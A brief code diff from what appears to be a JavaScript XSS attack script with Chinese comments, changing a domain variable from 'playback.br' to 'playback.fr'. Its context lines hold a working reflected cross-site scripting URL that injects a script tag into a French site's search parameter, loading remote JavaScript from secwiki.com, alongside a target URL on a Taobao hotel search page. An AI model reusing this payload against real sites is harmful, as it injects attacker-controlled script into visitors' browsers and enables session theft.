@@ -16,7 +16,7 @@ var target="http://jipiao.taobao.com/hotel/search_hotel.htm?_fmho.h._0.d=%CE%E4%
 
 // 前页面
 var org_url = "http://www.playback.fr/recherche.php?search=<script%20src=http://www.secwiki.com/athena/feed.js%20></script>+&button=OK";  
-var org_domain = "www.playback.br";
+var org_domain = "www.playback.fr";
 
 ////////////////////////////////////////////////////////////
 // 开始执行功能
